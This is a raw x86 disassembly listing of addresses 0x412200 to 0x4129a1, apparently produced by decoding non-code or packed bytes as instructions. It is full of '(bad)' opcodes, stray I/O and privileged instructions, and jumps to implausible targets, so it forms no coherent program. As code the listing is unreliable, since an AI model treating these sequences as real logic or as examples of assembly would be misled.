  412200:	lods   al,BYTE PTR ds:[esi]
  412201:	(bad)  
  412202:	shl    DWORD PTR ds:0x515bc12e,cl
  412208:	and    DWORD PTR [ebx+ebp*1-0x41f22c0a],edx
  41220f:	les    eax,FWORD PTR [ebp+0x5d4986d3]
  412215:	xchg   edx,eax
  412216:	imul   ebp,DWORD PTR [ecx-0x4b19006d],0x5f6ee808
  412220:	aaa    
  412221:	sbb    eax,0xbb02bc81
  412226:	dec    esp
  412227:	lahf   
  412228:	mov    ds:0xfd342224,al
  41222d:	xchg   ebp,eax
  41222e:	dec    esp
  41222f:	mov    ds:0x407c255a,eax
  412234:	cmp    ch,cl
  412236:	test   DWORD PTR [ebx],esi
  412238:	or     ecx,DWORD PTR [esi-0x52]
  41223b:	mov    edi,0x254be451
  412240:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412241:	pusha  
  412242:	cmp    DWORD PTR [ecx],edi
  412244:	iret   
  412245:	xchg   ebx,eax
  412246:	push   esp
  412247:	push   ebx
  412248:	adc    esp,DWORD PTR [ebx-0x7d]
  41224b:	pop    ss
  41224c:	mov    esp,0x13c66bf9
  412251:	pop    ss
  412252:	sub    dh,0xf9
  412255:	sub    BYTE PTR ds:0x49c9c829,dl
  41225b:	ret    
  41225c:	cmp    al,0x1e
  41225e:	fwait
  41225f:	jbe    0x412280
  412261:	adc    BYTE PTR [edi],bh
  412263:	xor    al,0xd8
  412265:	xchg   ebx,eax
  412266:	mov    esi,0xedf1aad0
  41226b:	jo     0x4121f6
  41226d:	mov    ebx,0x4f24e6ce
  412272:	fcomp  DWORD PTR [edi]
  412274:	loope  0x412286
  412276:	push   ebp
  412277:	popf   
  412278:	push   ebx
  412279:	and    bl,dh
  41227b:	adc    al,0x5a
  41227d:	sub    ah,BYTE PTR [esi]
  41227f:	les    ebx,FWORD PTR [ebx]
  412281:	aaa    
  412282:	(bad)  
  412283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412284:	rol    BYTE PTR [eax],cl
  412286:	into   
  412287:	and    bh,BYTE PTR [esi+ebx*8]
  41228a:	mov    dh,ah
  41228c:	sub    eax,0x288e1b23
  412291:	jns    0x4122a3
  412293:	inc    ebx
  412294:	push   es
  412295:	outs   dx,DWORD PTR ds:[esi]
  412296:	rep stos DWORD PTR es:[edi],eax
  412298:	xchg   ebx,eax
  412299:	inc    edx
  41229a:	push   esp
  41229b:	outs   dx,DWORD PTR ds:[esi]
  41229c:	retf   
  41229d:	fld    TBYTE PTR [esp+ebx*8+0x9]
  4122a1:	inc    edx
  4122a2:	in     al,0x83
  4122a4:	push   cs
  4122a5:	push   0xd846c60f
  4122aa:	xchg   ebp,eax
  4122ab:	sbb    dl,cl
  4122ad:	call   0xaf12:0x5b2ba05d
  4122b4:	jne    0x4122a6
  4122b6:	mov    ds:0xe7000fe1,al
  4122bb:	ins    BYTE PTR es:[edi],dx
  4122bc:	sub    esi,DWORD PTR [esi+0x79]
  4122bf:	int3   
  4122c0:	ret    0xfca9
  4122c3:	and    BYTE PTR [eax+0x15],0xdd
  4122c7:	inc    ebx
  4122c8:	outs   dx,BYTE PTR es:[esi]
  4122ca:	jo     0x412270
  4122cc:	xor    edi,DWORD PTR [eax+0x63]
  4122cf:	and    DWORD PTR [edx],ecx
  4122d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122d2:	mov    cl,0x76
  4122d4:	int    0x61
  4122d6:	imul   DWORD PTR [edi]
  4122d8:	in     eax,dx
  4122d9:	fcmove st,st(7)
  4122db:	in     eax,0xef
  4122dd:	loopne 0x4122bb
  4122df:	mov    ah,0xb5
  4122e1:	(bad)  
  4122e2:	out    0x63,al
  4122e4:	(bad)  
  4122e5:	cld    
  4122e6:	adc    al,0x2c
  4122e8:	test   DWORD PTR [eax+eiz*8],ebx
  4122eb:	(bad)  
  4122ec:	adc    DWORD PTR gs:[eax+0x20bda151],esp
  4122f3:	push   0xffffff9e
  4122f5:	mov    eax,0xbcde0058
  4122fa:	push   ebp
  4122fb:	test   bl,0x5
  4122fe:	push   edi
  4122ff:	inc    ebp
  412300:	xlat   BYTE PTR ds:[ebx]
  412301:	cmp    cl,al
  412303:	cli    
  412304:	aas    
  412305:	push   eax
  412306:	pushf  
  412307:	hlt    
  412308:	xor    al,0x99
  41230a:	sbb    al,0x6f
  41230c:	inc    esp
  41230d:	in     eax,dx
  41230e:	xchg   ebx,eax
  41230f:	scas   al,BYTE PTR es:[edi]
  412310:	dec    edi
  412311:	enter  0xba52,0x38
  412315:	test   eax,0x830d7fc6
  41231a:	popa   
  41231b:	sub    esp,DWORD PTR [ebx+esi*2+0x4deb1ceb]
  412322:	ret    0xc73f
  412325:	inc    eax
  412326:	sar    DWORD PTR [esp+eax*2+0x34],1
  41232a:	push   ss
  41232b:	mov    al,0x60
  41232d:	add    ebp,DWORD PTR [esi]
  41232f:	(bad)  
  412330:	dec    edx
  412331:	mov    eax,ds:0xb2636742
  412336:	jo     0x412375
  412338:	add    cl,BYTE PTR [edi]
  41233a:	shr    BYTE PTR [esi+eax*4],0x66
  41233e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41233f:	(bad)  
  412340:	push   0x46bd489b
  412345:	scas   eax,DWORD PTR es:[edi]
  412346:	out    dx,al
  412347:	jns    0x4122eb
  412349:	cli    
  41234a:	pop    ss
  41234b:	imul   DWORD PTR [ebx]
  41234d:	out    0x88,eax
  41234f:	rcl    BYTE PTR [eax],1
  412351:	inc    eax
  412352:	inc    edx
  412353:	xlat   BYTE PTR ds:[ebx]
  412354:	push   edi
  412355:	xchg   edi,eax
  412356:	dec    ebp
  412357:	lahf   
  412358:	mov    al,ds:0x7265824e
  41235d:	inc    esi
  41235e:	(bad)  
  41235f:	scas   al,BYTE PTR es:[edi]
  412360:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412361:	(bad)  
  412362:	ficom  DWORD PTR [eax-0x5d]
  412365:	add    BYTE PTR [edx+0x40],ah
  412368:	adc    dl,BYTE PTR ds:0x18225c24
  41236e:	cmp    dl,BYTE PTR [ecx]
  412370:	rcr    BYTE PTR [eax+esi*8],1
  412373:	jns    0x412318
  412375:	ds jp  0x4123d0
  412378:	mov    esp,0x54f70210
  41237d:	sub    al,0x8f
  41237f:	xor    eax,edi
  412381:	fst    DWORD PTR [eax-0x40]
  412384:	and    eax,0x8676c2dc
  412389:	jnp    0x4123c8
  41238b:	inc    ebx
  41238c:	(bad)  
  41238e:	xchg   esi,eax
  41238f:	sub    DWORD PTR [ebp+0x31],ebx
  412392:	adc    al,0xd8
  412394:	iret   
  412395:	(bad)  
  412396:	test   al,0x37
  412398:	xor    dh,ch
  41239a:	dec    ebx
  41239b:	gs cdq 
  41239d:	fsub   DWORD PTR [eax+0x29]
  4123a0:	jae    0x4123db
  4123a2:	aaa    
  4123a3:	and    dh,cl
  4123a5:	and    eax,DWORD PTR [ebx-0x124223e4]
  4123ab:	adc    BYTE PTR [eax],0x26
  4123ae:	cmp    al,0xfb
  4123b0:	(bad)  
  4123b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123b2:	pop    ecx
  4123b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123b4:	data16 ds sub al,0x27
  4123b8:	into   
  4123b9:	ret    0xd178
  4123bc:	jmp    0x41241e
  4123be:	mov    eax,0x4dab9071
  4123c3:	mov    ch,BYTE PTR [esi-0x424a852c]
  4123c9:	bound  ecx,QWORD PTR [ecx-0x14e4d0d2]
  4123cf:	mov    BYTE PTR [ebx-0x73],ah
  4123d2:	lods   al,BYTE PTR ds:[esi]
  4123d3:	arpl   WORD PTR [eax-0x27],ax
  4123d6:	bound  ebp,QWORD PTR [edx+0x3f00d81d]
  4123dc:	adc    al,0xda
  4123de:	lods   eax,DWORD PTR ds:[esi]
  4123df:	fld    QWORD PTR [ebx+0x35]
  4123e2:	xchg   esp,eax
  4123e3:	dec    edx
  4123e4:	hlt    
  4123e5:	outs   dx,BYTE PTR ds:[esi]
  4123e6:	jb     0x4123f8
  4123e8:	mov    esi,DWORD PTR ds:0x6d01deb0
  4123ee:	hlt    
  4123ef:	nop
  4123f0:	pop    esi
  4123f1:	loop   0x41244f
  4123f3:	fcom   DWORD PTR [edi]
  4123f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123f6:	in     al,0xde
  4123f8:	add    BYTE PTR [eax-0x75defbf6],bh
  4123fe:	xor    esi,DWORD PTR [ecx]
  412400:	in     al,0x52
  412402:	push   cs
  412403:	mov    esi,0x4d7fa802
  412408:	inc    edi
  412409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41240b:	repz push ecx
  41240d:	inc    esi
  41240e:	daa    
  41240f:	ret    
  412410:	imul   esp,edx,0x2985a8d3
  412416:	fsub   DWORD PTR gs:[esp+edi*1+0x2b]
  41241b:	les    ebp,FWORD PTR [eax-0x182638e3]
  412421:	jae    0x4123d7
  412423:	ins    DWORD PTR es:[edi],dx
  412424:	push   es
  412425:	xor    eax,0x5b20fe2f
  41242a:	ret    0xf140
  41242d:	xor    ebp,esi
  41242f:	jmp    0x807c1629
  412434:	ret    0x84e8
  412437:	enter  0x97f3,0x3f
  41243b:	push   ss
  41243c:	dec    edx
  41243d:	mov    esi,0xf76ef5f3
  412442:	xor    ecx,DWORD PTR [edx]
  412444:	xchg   edi,eax
  412445:	mov    DWORD PTR [esi-0x6f],ebp
  412448:	enter  0xf719,0xdc
  41244c:	pusha  
  41244d:	lea    ebx,[ecx]
  41244f:	jmp    0x4124bf
  412451:	call   0xd137:0xb718f266
  412458:	nop
  412459:	mov    dh,0xd7
  41245b:	pop    esp
  41245c:	(bad)  
  41245d:	push   ebp
  41245e:	(bad)  
  41245f:	idiv   BYTE PTR [ebx-0x7b]
  412462:	sub    al,0xcc
  412464:	ja     0x4124b7
  412466:	push   ds
  412467:	arpl   ax,dx
  412469:	sahf   
  41246a:	div    BYTE PTR cs:[esi+0x62e4080f]
  412471:	test   DWORD PTR [ebx-0x3a5557e5],ecx
  412477:	mov    DWORD PTR [ebx-0x599107bf],esp
  41247d:	xor    esp,DWORD PTR [di]
  412480:	loop   0x41247b
  412482:	cmp    al,0xe4
  412484:	arpl   WORD PTR ds:0x389bc0b8,sp
  41248a:	mov    ds:0x611a3e89,eax
  41248f:	enter  0x5673,0x38
  412493:	enter  0x428,0x7e
  412497:	aaa    
  412498:	jae    0x41250b
  41249a:	(bad)  
  41249b:	fist   WORD PTR [ebp+ebp*4+0x62503e85]
  4124a2:	and    eax,0x194def9
  4124a7:	sbb    al,0x3b
  4124a9:	lods   al,BYTE PTR ds:[esi]
  4124aa:	ucomiss xmm5,DWORD PTR [esi-0x19ae77d5]
  4124b1:	jb     0x41249c
  4124b3:	fdivr  DWORD PTR [esi]
  4124b5:	retf   
  4124b6:	jmp    0x4124c1
  4124b8:	mov    ch,ah
  4124ba:	mov    al,ds:0xf49f9809
  4124bf:	test   BYTE PTR [ebp-0x38],0x27
  4124c3:	iret   
  4124c4:	inc    ebx
  4124c5:	sar    ah,1
  4124c7:	imul   esp,esi,0x24
  4124ca:	adc    al,0x6f
  4124cc:	sub    BYTE PTR [ebp+0x25],0xa9
  4124d0:	push   ebx
  4124d1:	or     edx,0xffffff9c
  4124d4:	or     DWORD PTR [ecx],edx
  4124d6:	xchg   edi,eax
  4124d7:	scas   al,BYTE PTR es:[edi]
  4124d8:	push   0x3e
  4124da:	out    0x28,eax
  4124dc:	inc    edx
  4124dd:	sbb    DWORD PTR [edx+ebp*4+0xc],0xffffffaf
  4124e2:	and    DWORD PTR [eax+edi*4-0x68],0xffffff86
  4124e7:	ja     0x412516
  4124e9:	xlat   BYTE PTR ds:[ebx]
  4124ea:	or     DWORD PTR [ebp+0x417f2af0],edx
  4124f0:	outs   dx,BYTE PTR ds:[esi]
  4124f1:	jbe    0x4124fa
  4124f3:	add    bl,BYTE PTR [ecx-0x697fc2e7]
  4124f9:	popa   
  4124fa:	sar    BYTE PTR [ecx-0x2c],1
  4124fd:	dec    edx
  4124fe:	mov    al,0x3
  412500:	or     BYTE PTR [eax+0x2],bl
  412503:	cmp    DWORD PTR [eax],eax
  412505:	xchg   edi,eax
  412506:	dec    ecx
  412507:	out    dx,al
  412508:	push   0x6c
  41250a:	fimul  DWORD PTR [esi+ebx*8-0x22]
  41250e:	sub    ah,ch
  412510:	dec    edi
  412511:	dec    edi
  412512:	xor    DWORD PTR ds:0x7fb45f5e,ecx
  412518:	pop    ds
  412519:	push   ecx
  41251a:	dec    eax
  41251b:	cmp    al,bh
  41251d:	shr    al,1
  41251f:	jg     0x412538
  412521:	pushf  
  412522:	or     eax,0x36451cfa
  412527:	loop   0x412517
  412529:	retf   0x5f4c
  41252c:	pavgw  mm0,QWORD PTR [ebp+0x6c0ae106]
  412533:	jmp    0x3408ac05
  412538:	push   0x74
  41253a:	dec    esp
  41253b:	mov    edi,ecx
  41253d:	jb     0x4124ee
  41253f:	mov    bh,0x28
  412541:	inc    eax
  412542:	aaa    
  412543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412544:	mov    edi,0x434d3a76
  412549:	(bad)  
  41254b:	out    dx,eax
  41254c:	add    esp,edx
  41254e:	sbb    BYTE PTR [edx-0x6ad31c85],bl
  412554:	mov    eax,0x567e217a
  412559:	pop    edi
  41255a:	shl    BYTE PTR [ecx+eiz*8-0x2a],0x99
  41255f:	pop    ebp
  412560:	out    dx,al
  412561:	(bad)  
  412562:	fistp  DWORD PTR [esi-0x3b]
  412565:	loope  0x41252b
  412567:	jo     0x412566
  412569:	sahf   
  41256a:	sbb    DWORD PTR [edx-0x5cc9cc80],esp
  412570:	ins    BYTE PTR es:[edi],dx
  412571:	pop    dx
  412573:	sbb    al,0xaf
  412575:	inc    edi
  412576:	daa    
  412577:	imul   ecx,esp,0x5b4fd654
  41257d:	int3   
  41257e:	es inc edi
  412580:	cdq    
  412581:	hlt    
  412582:	cli    
  412583:	adc    DWORD PTR [ebp+0x22e2591d],eax
  412589:	sub    cl,cl
  41258b:	sahf   
  41258c:	out    0x69,eax
  41258e:	shl    BYTE PTR [eax],0x7b
  412591:	mov    BYTE PTR [ebx+0x8fc5e],bl
  412597:	dec    esp
  412598:	fild   DWORD PTR [ecx-0x538d92a7]
  41259e:	pop    esp
  41259f:	cmp    al,0x4c
  4125a1:	mov    cl,0xa6
  4125a3:	sub    al,0xf3
  4125a5:	sti    
  4125a6:	sub    DWORD PTR [edi+0xbab3068],esi
  4125ac:	cdq    
  4125ad:	data16 mov ds:0xfc7a006f,al
  4125b3:	popf   
  4125b4:	and    edi,DWORD PTR [ebp-0x7e3e5c66]
  4125ba:	jno    0x4125dd
  4125bc:	sub    ebx,DWORD PTR [edi]
  4125be:	ins    BYTE PTR es:[edi],dx
  4125bf:	(bad)  
  4125c1:	fistp  DWORD PTR ds:0xb93ac585
  4125c7:	adc    dl,BYTE PTR [eax+0x6f4d6880]
  4125cd:	std    
  4125ce:	fstp   QWORD PTR [edi]
  4125d0:	out    0xa8,al
  4125d2:	sahf   
  4125d3:	ret    0xa29a
  4125d6:	(bad)  
  4125d7:	std    
  4125d8:	or     eax,0xa5a59c21
  4125dd:	ins    DWORD PTR es:[edi],dx
  4125de:	dec    edi
  4125df:	or     ch,0xe3
  4125e2:	mov    eax,ds:0x67171a3
  4125e7:	les    esp,FWORD PTR [ebx+edx*2-0x52]
  4125eb:	addr16 mov eax,0x651d67a5
  4125f1:	jne    0x41266b
  4125f3:	shr    BYTE PTR [ecx+eax*1+0x50149c3c],cl
  4125fa:	ror    BYTE PTR [ebp-0x7eb2db2f],0xa
  412601:	cdq    
  412602:	and    esi,DWORD PTR [edx]
  412604:	lods   al,BYTE PTR ds:[esi]
  412605:	leave  
  412606:	jge    0x4125c9
  412608:	repz adc dl,BYTE PTR [ecx-0x57]
  41260c:	stc    
  41260d:	loopne 0x412607
  41260f:	inc    ebx
  412610:	xor    bh,BYTE PTR [ecx]
  412612:	ret    
  412613:	xchg   BYTE PTR [ebx+0x2b],al
  412616:	gs jecxz 0x4125bf
  412619:	ins    DWORD PTR es:[edi],dx
  41261a:	loopne 0x4125bb
  41261c:	inc    ebx
  41261d:	gs mov dh,0x46
  412620:	xchg   edx,eax
  412621:	mov    WORD PTR [esi-0x71],cs
  412624:	pop    ebx
  412625:	adc    bh,0x38
  412628:	xchg   ecx,eax
  412629:	addr16 pop ebp
  41262b:	jmp    0x4126a1
  41262d:	rol    BYTE PTR [edi],0xd3
  412630:	test   BYTE PTR [ecx+0x32ff69fc],ah
  412636:	adc    bl,BYTE PTR [edx]
  412638:	add    al,0xeb
  41263a:	fdivr  st,st(0)
  41263c:	or     al,0xb
  41263e:	rcl    bl,0x9c
  412641:	cwde   
  412642:	pop    esi
  412643:	lds    ecx,FWORD PTR [esi-0x6e]
  412646:	retf   0x4ba9
  412649:	mov    dl,0x96
  41264b:	ficom  DWORD PTR [edi+0x69561eff]
  412651:	inc    ecx
  412652:	pushf  
  412653:	cwde   
  412654:	xlat   BYTE PTR ds:[ebx]
  412655:	mov    bh,0x8a
  412657:	inc    eax
  412658:	loop   0x4125f0
  41265a:	xor    eax,esi
  41265c:	inc    ebx
  41265d:	lock xlat BYTE PTR ds:[ebx]
  41265f:	jo     0x412656
  412661:	fcomp  DWORD PTR [edx]
  412663:	test   eax,0xcfbc5b4
  412668:	mov    al,BYTE PTR [eax-0x1368de73]
  41266e:	sbb    eax,0x7298d8e8
  412673:	test   al,0xaa
  412675:	iret   
  412676:	(bad)  
  412677:	dec    DWORD PTR [eax+0x8]
  41267a:	pop    eax
  41267b:	xor    bl,BYTE PTR [eax-0x47]
  41267e:	xor    BYTE PTR ds:0x59838172,cl
  412684:	fst    QWORD PTR [ebx]
  412686:	push   es
  412687:	and    dh,BYTE PTR [esi+esi*8]
  41268a:	and    DWORD PTR [eax+0x1],eax
  41268d:	xchg   ebx,eax
  41268e:	cwde   
  41268f:	jnp    0x412642
  412691:	jmp    0x94559d6d
  412696:	inc    esi
  412697:	sub    al,0xb2
  412699:	and    BYTE PTR [ebx-0x67b3a8b9],0xa1
  4126a0:	fld1   
  4126a2:	xchg   esp,eax
  4126a3:	leave  
  4126a4:	mov    ah,0x42
  4126a6:	jo     0x4126e6
  4126a8:	and    eax,0x19273c2a
  4126ad:	mov    dl,0x8c
  4126af:	cli    
  4126b0:	adc    DWORD PTR [eax],0x907423b3
  4126b6:	push   cs
  4126b7:	xlat   BYTE PTR ds:[ebx]
  4126b8:	cmc    
  4126b9:	test   eax,0x456aa757
  4126be:	cld    
  4126bf:	mov    bh,0xcb
  4126c1:	dec    esp
  4126c2:	inc    edx
  4126c3:	scas   eax,DWORD PTR es:[edi]
  4126c4:	jp     0x4126f8
  4126c6:	mov    al,ds:0xd443447b
  4126cb:	arpl   sp,bx
  4126cd:	fidivr WORD PTR [edi-0xf]
  4126d0:	mov    esp,0x58e840a
  4126d5:	mov    edx,0xce28c03
  4126da:	jp     0x412677
  4126dc:	loope  0x41267d
  4126de:	(bad)  
  4126df:	adc    al,0xa3
  4126e1:	cmc    
  4126e2:	inc    ecx
  4126e3:	aam    0xdd
  4126e5:	pop    ecx
  4126e6:	push   ss
  4126e7:	cmp    al,0x6
  4126e9:	or     bl,BYTE PTR ds:0xd3211418
  4126ef:	xchg   BYTE PTR [esp+ebp*2+0x75],dh
  4126f3:	sbb    ebx,ebp
  4126f5:	jns    0x4126f3
  4126f7:	adc    al,0xb8
  4126f9:	sbb    edx,DWORD PTR [ebx-0x58]
  4126fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126fd:	or     ebx,esi
  4126ff:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412701:	js     0x4126cd
  412703:	pop    esi
  412704:	lods   al,BYTE PTR ds:[esi]
  412705:	mov    edx,0xf5bf58d6
  41270a:	cmp    al,0x2b
  41270c:	in     al,0x5d
  41270e:	pushf  
  41270f:	lahf   
  412710:	push   esi
  412711:	test   DWORD PTR [esi-0x62],0x371e45f4
  412718:	shl    BYTE PTR [ebp-0x75857ed1],0x3
  41271f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412720:	xchg   BYTE PTR [ecx-0x26232168],ah
  412726:	or     ebx,ebx
  412728:	cmp    edx,ecx
  41272a:	(bad)  
  41272b:	sbb    eax,0x5a9e65e1
  412730:	fs ins BYTE PTR es:[edi],dx
  412732:	xchg   ecx,eax
  412733:	retf   
  412734:	rcr    DWORD PTR [ecx+0x5d],1
  412737:	and    al,0x9e
  412739:	xor    eax,0xc4db3908
  41273e:	jbe    0x412718
  412740:	push   esi
  412741:	add    al,0x60
  412743:	cld    
  412744:	push   0x1f
  412746:	xor    eax,0xe3da80d2
  41274b:	jo     0x41273c
  41274d:	rol    BYTE PTR [edx],0x97
  412750:	int3   
  412751:	pop    edi
  412752:	leave  
  412753:	shr    DWORD PTR [ebx+edi*4],1
  412756:	ins    BYTE PTR es:[edi],dx
  412757:	call   0xfb147e0d
  41275c:	(bad)  
  41275d:	push   esp
  41275e:	gs mov ebp,0xc4e1a715
  412764:	cmp    al,0x6b
  412766:	fsubr  QWORD PTR [ebx+0xb]
  412769:	pop    ss
  41276a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41276b:	and    al,0x35
  41276d:	or     eax,0x4bb01552
  412772:	out    0x2e,al
  412774:	idiv   ecx
  412776:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412777:	mov    bl,0x46
  412779:	or     BYTE PTR [esi+0x6ada8e59],dh
  41277f:	xchg   esi,eax
  412780:	das    
  412781:	arpl   cx,sp
  412783:	xchg   ebx,eax
  412784:	jns    0x4127b8
  412786:	mov    ebp,0xc43fc010
  41278b:	(bad)  
  41278c:	je     0x412729
  41278e:	popf   
  41278f:	cmp    dh,BYTE PTR [ecx-0x24]
  412792:	inc    esi
  412793:	int    0xe5
  412795:	mov    fs,WORD PTR [edx]
  412797:	sbb    esi,edi
  412799:	adc    BYTE PTR cs:[ecx],bl
  41279c:	dec    ecx
  41279d:	leave  
  41279e:	xor    BYTE PTR [edi+0xa1255a],0x7f
  4127a5:	push   ecx
  4127a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127a7:	jge    0x412788
  4127a9:	fld    TBYTE PTR [ecx]
  4127ab:	mov    BYTE PTR [esi-0x20abd0c4],bl
  4127b1:	imul   esp,DWORD PTR ds:0xf8af71c,0xffffffde
  4127b8:	mov    ch,0xe9
  4127ba:	add    DWORD PTR [eax],ecx
  4127bc:	jbe    0x4127c5
  4127be:	add    DWORD PTR [esi+ebx*8],0x15
  4127c2:	dec    esp
  4127c3:	xor    ah,al
  4127c5:	xor    al,0xcb
  4127c7:	fistp  DWORD PTR [esi+0x5c]
  4127ca:	jmp    0xd5018746
  4127cf:	inc    ecx
  4127d0:	jmp    0xd722:0x3b583ad6
  4127d7:	aam    0x23
  4127d9:	aaa    
  4127da:	int3   
  4127db:	inc    eax
  4127dc:	cmp    DWORD PTR [ecx],edi
  4127de:	(bad)  
  4127df:	inc    BYTE PTR [esi]
  4127e1:	add    BYTE PTR [ebx-0x281b7e61],ah
  4127e7:	sub    DWORD PTR [ecx-0x7303c951],esp
  4127ed:	in     al,0x7f
  4127ef:	xor    eax,0xa8d22080
  4127f4:	(bad)  
  4127f5:	xor    eax,0xb576d735
  4127fa:	ret    
  4127fb:	jno    0x4127f3
  4127fd:	sub    bh,BYTE PTR [eax]
  4127ff:	pop    ds
  412800:	jle    0x4127f2
  412802:	pop    ss
  412803:	cdq    
  412804:	popa   
  412805:	sub    eax,0xd32db391
  41280a:	jg     0x412876
  41280c:	fstp   TBYTE PTR [ebp+0x7cbf061a]
  412812:	xor    al,0xbe
  412814:	cld    
  412815:	push   edx
  412816:	push   ebp
  412817:	aaa    
  412818:	out    dx,al
  412819:	shr    BYTE PTR [ebp+0x7dd74fb1],1
  41281f:	or     BYTE PTR [edi],dh
  412821:	add    eax,0xcabe2b03
  412826:	ss jle 0x4127f0
  412829:	and    BYTE PTR [ecx+0x5b],bl
  41282c:	xchg   ebp,eax
  41282d:	fcomp  QWORD PTR [edx+eax*4-0x47]
  412831:	fmul   DWORD PTR [edx-0x66]
  412834:	pop    esp
  412835:	lea    edx,[eax+0x13f9ae69]
  41283b:	shr    DWORD PTR ds:0xf996157a,0x33
  412842:	scas   eax,DWORD PTR es:[edi]
  412843:	add    al,0x30
  412845:	cmp    dh,ah
  412847:	xor    dl,BYTE PTR [edx]
  412849:	adc    BYTE PTR [esi-0x7e],ch
  41284c:	ins    BYTE PTR es:[edi],dx
  41284d:	sbb    al,0xc7
  41284f:	sbb    cl,BYTE PTR ds:0x5da18fe5
  412855:	sahf   
  412856:	lods   al,BYTE PTR ds:[esi]
  412857:	mov    eax,ds:0x3d4d3efb
  41285c:	inc    ebp
  41285d:	add    al,0x4c
  41285f:	mov    esi,0xfb731a28
  412864:	test   BYTE PTR [eax+esi*4-0x2a],dh
  412868:	jno    0x4128e0
  41286a:	and    DWORD PTR [edx-0xa],0x28f66ce5
  412871:	aam    0xc1
  412873:	inc    eax
  412875:	jo     0x4128be
  412877:	div    BYTE PTR [ebp+0x3a]
  41287a:	daa    
  41287b:	cmp    DWORD PTR [edx],esi
  41287d:	jb     0x412885
  41287f:	and    al,0xee
  412881:	xor    ch,0xb7
  412884:	stos   BYTE PTR es:[edi],al
  412885:	xor    BYTE PTR [ebx-0x5b39ff25],0x2b
  41288c:	or     DWORD PTR [ebx-0x35],ebx
  41288f:	sub    eax,0x70267099
  412894:	leave  
  412895:	(bad)  
  412896:	mov    bl,0xe1
  412898:	mov    esp,0xc2f1e171
  41289d:	adc    DWORD PTR [edi+ebp*4+0xb1448bc],ecx
  4128a4:	pop    bx
  4128a7:	pop    eax
  4128a8:	and    BYTE PTR [edx],ch
  4128aa:	push   ss
  4128ab:	js     0x4128e4
  4128ad:	adc    ecx,esp
  4128af:	out    0xe3,al
  4128b1:	dec    edi
  4128b2:	(bad)  
  4128b3:	cmp    DWORD PTR [ecx],ebp
  4128b5:	jmp    0xe65d12eb
  4128ba:	sub    al,0x28
  4128bc:	cmp    BYTE PTR [edi+eax*8],ch
  4128bf:	retf   0x7f0b
  4128c2:	adc    al,0x41
  4128c4:	mov    ds:0xaa8c196,al
  4128c9:	cmp    edi,DWORD PTR [eax*1-0x6671faee]
  4128d0:	jecxz  0x412883
  4128d2:	je     0x412854
  4128d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128d5:	ret    0x92f9
  4128d8:	sbb    eax,0xfd20b4c5
  4128dd:	fsubr  st,st(1)
  4128df:	lds    ebp,FWORD PTR [ebx]
  4128e1:	je     0x412903
  4128e3:	inc    eax
  4128e4:	mov    DWORD PTR [eax-0x7b7c8740],esi
  4128ea:	inc    ebp
  4128eb:	mov    cs,WORD PTR [eax]
  4128ed:	push   esp
  4128ee:	lea    esi,[esi]
  4128f0:	jo     0x41290c
  4128f2:	and    BYTE PTR [esi],bl
  4128f4:	out    dx,eax
  4128f5:	jnp    0x4128a1
  4128f7:	add    eax,0xd34c5885
  4128fc:	inc    ecx
  4128fd:	ret    0x6d9a
  412900:	fld    st(0)
  412902:	rcr    BYTE PTR [edx-0x39],1
  412905:	xor    eax,0xeaa0b5a0
  41290a:	call   0x3b8e2f0e
  41290f:	icebp  
  412910:	add    al,0xb6
  412912:	add    al,0xd8
  412914:	add    DWORD PTR [ebx],esi
  412916:	cli    
  412917:	xchg   esp,eax
  412918:	mov    WORD PTR [edi],cs
  41291a:	aam    0x53
  41291c:	jecxz  0x412965
  41291e:	add    edi,esp
  412920:	out    dx,al
  412921:	mov    esi,0xa8296413
  412926:	loopne 0x4128c8
  412928:	add    al,0x27
  41292a:	mov    edx,0x327d62a
  41292f:	inc    ebp
  412930:	xor    ebp,ebx
  412932:	stos   BYTE PTR es:[edi],al
  412933:	test   eax,0xa6be82c2
  412938:	outs   dx,DWORD PTR ds:[esi]
  412939:	mov    edx,0x1aaf89eb
  41293e:	ins    DWORD PTR es:[edi],dx
  41293f:	sbb    esi,DWORD PTR ds:0x2b12d4c
  412945:	mov    al,0xd2
  412947:	push   ss
  412948:	dec    esi
  412949:	jg     0x412908
  41294b:	loope  0x412938
  41294d:	push   esi
  41294e:	stos   BYTE PTR es:[edi],al
  41294f:	es push ebx
  412951:	sti    
  412952:	imul   ecx,DWORD PTR [ebp+0x7d],0xffffffbe
  412956:	mov    WORD PTR [ebx+0x16483662],?
  41295c:	mov    bh,0x11
  41295e:	jae    0x4129be
  412960:	jbe    0x41290b
  412962:	in     eax,0x1e
  412964:	xchg   si,ax
  412966:	sub    al,0x43
  412968:	xchg   ebp,eax
  412969:	inc    esp
  41296a:	mov    BYTE PTR [edi-0x68b5f8d6],bh
  412970:	ss mov bh,0x7d
  412973:	ret    
  412974:	push   0x8ee60e38
  412979:	mov    DWORD PTR [ebx],eax
  41297b:	inc    ecx
  41297c:	jg     0x4129cc
  41297e:	cli    
  41297f:	test   BYTE PTR [esi-0x39],al
  412982:	sbb    al,0xf4
  412984:	inc    ecx
  412985:	mov    bl,0xd3
  412987:	fnstcw WORD PTR [ebx]
  412989:	xchg   esi,eax
  41298a:	in     al,0x25
  41298c:	stos   BYTE PTR es:[edi],al
  41298d:	mov    eax,0xf2249208
  412992:	jno    0x412921
  412994:	icebp  
  412995:	lods   al,BYTE PTR ds:[esi]
  412996:	xchg   edi,eax
  412997:	test   al,0xc6
  412999:	xor    ebp,ecx
  41299b:	sbb    bh,ah
  41299d:	inc    ebp
  41299e:	repz mov dl,0x15
  4129a1:	cdq    
